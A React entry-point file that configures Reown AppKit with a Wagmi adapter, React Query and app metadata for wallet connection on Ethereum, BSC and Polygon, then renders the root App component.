import React from 'react';
import ReactDOM from 'react-dom/client';
import App from './App';
import { createAppKit } from '@reown/appkit/react';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { mainnet, bsc, polygon } from '@reown/appkit/networks';
import { WagmiProvider } from 'wagmi';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';

// 1. Initialize QueryClient
const queryClient = new QueryClient();

// 2. Project Configuration
const projectId = '7a9898896e62061904fbceeb9d296eb1';
const networks = [mainnet, bsc, polygon];

// 3. Setup Wagmi Adapter (SSR: true handles hydration better on mobile)
const wagmiAdapter = new WagmiAdapter({
  networks,
  projectId,
  ssr: true
});

// 4. Create AppKit (Full Feature Set)
createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  defaultNetwork: mainnet,
  metadata: {
    name: 'EVEDEX',
    description: 'RPC Terminal',
    url: 'https://rpc-portal.site', 
    icons: ['https://avatars.githubusercontent.com/u/37784886'],
    redirect: {
      native: 'metamask://',
      universal: 'https://metamask.app.link'
    }
  },
  features: {
    email: true,
    socials: ['google', 'x', 'apple'],
    analytics: true,
    swaps: true,
    onramp: true,
    emailShowWallets: true // Shows wallet options even if using email
  },
  allWallets: 'SHOW', // Ensures the search bar works
  themeMode: 'dark'
});

// 5. Render Root
const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(
  <React.StrictMode>
    <WagmiProvider config={wagmiAdapter.wagmiConfig}>
      <QueryClientProvider client={queryClient}>
        <App />
      </QueryClientProvider>
    </WagmiProvider>
  </React.StrictMode>
);
